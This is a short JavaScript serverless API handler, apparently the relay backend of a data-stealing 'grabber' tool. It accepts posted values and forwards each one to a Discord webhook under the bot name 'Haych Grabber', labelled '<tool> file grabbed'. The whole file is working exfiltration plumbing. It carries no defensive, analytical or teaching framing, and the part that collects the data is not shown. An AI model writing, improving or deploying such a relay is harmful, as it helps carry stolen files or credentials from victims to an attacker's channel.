export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { tool, value } = req.body;

  if (!value) {
    return res.status(400).json({ error: 'No value provided' });
  }

  const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

  if (!WEBHOOK_URL) {
    console.error("DISCORD_WEBHOOK_URL missing in env vars");
    return res.status(500).json({ error: 'Server misconfigured - no webhook' });
  }

  try {
    const payload = {
      content: `**${tool.charAt(0).toUpperCase() + tool.slice(1)} file grabbed**\nValue:\n\`\`\`${value}\`\`\``,
      username: "Haych Grabber"
    };

    const discordRes = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (discordRes.ok) {
      return res.status(200).json({ success: true });
    } else {
      const errorText = await discordRes.text();
      console.error('Discord fail:', discordRes.status, errorText);
      return res.status(discordRes.status).json({ error: 'Discord forward failed' });
    }
  } catch (err) {
    console.error('Proxy crash:', err);
    return res.status(500).json({ error: 'Server error' });
  }
}
